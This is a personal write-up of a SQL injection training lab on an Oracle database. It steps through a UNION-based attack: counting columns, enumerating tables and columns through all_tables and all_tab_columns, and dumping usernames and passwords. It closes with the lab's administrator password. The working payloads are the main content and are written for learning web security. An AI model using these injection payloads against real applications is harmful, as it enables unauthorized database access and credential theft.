# Oracle database listing
#UNION 
#WRITEUP 
#DATABASEENUM 

The lab mentions to use an `UNION` attack so follow the [[Methodology UNION attacks]]

## 1. Columns of result set

As this is an Oracle database scenario the `UNION` payload is different, refer to [[Oracle querying database type and version]].

![[SQLInjection/Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on Oracle/image/columns.png]]

The result set has two columns.

## 2. Columns that can hold string data

Both columns can hold string data

![[SQLInjection/Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on Oracle/image/string data.png]]

## 3. Extract data

### Tables names

Extract the tables names from `all_tables` with the following payloads

```SQL
' UNION SELECT TABLE_NAME,NULL FROM all_tables--
```

![[tables names.png]]

As it's a similar scenario from the [[Non-Oracle databases listing contents]] I looked directly for the `users_XXXXX` table.

![[interesting table.png]]

`USERS_PGXVFU`

### Table columns

Then list the columns of the table with the following payload:

```SQL
' UNION SELECT COLUMN_NAME,NULL FROM all_tab_columns WHERE table_name = 'USERS_PGXVFU'--
```

![[interesting columns.png]]

Finally extract the data from:

```
PASSWORD_DVGJZA

USERNAME_FVMHGL
```

With the following payload:

```SQL
' UNION SELECT USERNAME_FVMHGL,PASSWORD_DVGJZA FROM USERS_PGXVFU--
```

![[SQLInjection/Attacks/Enumerating the database/labs/SQL injection attack, listing the database contents on Oracle/image/admin creds.png]]

```
administrator:1fivsuazttskz208mteg
```

Finally, log in as the administrator user and the lab is solved!